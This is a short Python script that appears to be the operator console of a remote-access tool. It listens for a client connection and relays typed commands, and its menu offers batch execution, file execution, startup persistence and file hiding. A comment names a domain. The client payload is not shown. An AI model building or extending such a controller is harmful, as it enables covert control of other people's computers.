from Constants.Server_class import Socket
from socket import gethostname

connection = Socket(gethostname(), 20000)


print("\nexecute batch: -batch [args] [script(new line = /n)]")
print("execute file: -e")
print("startup file -s")
print("hide file -h")
while True:
    if not connection.established:
        connection.listen_for_client()
    print("\nEnter command:")
    user_input = input("> ")
    connection.send_msg(user_input)
    if "-batch" in user_input:
        print(connection.receive_message())




# uhblajkil.cf
# Verbindung fixen


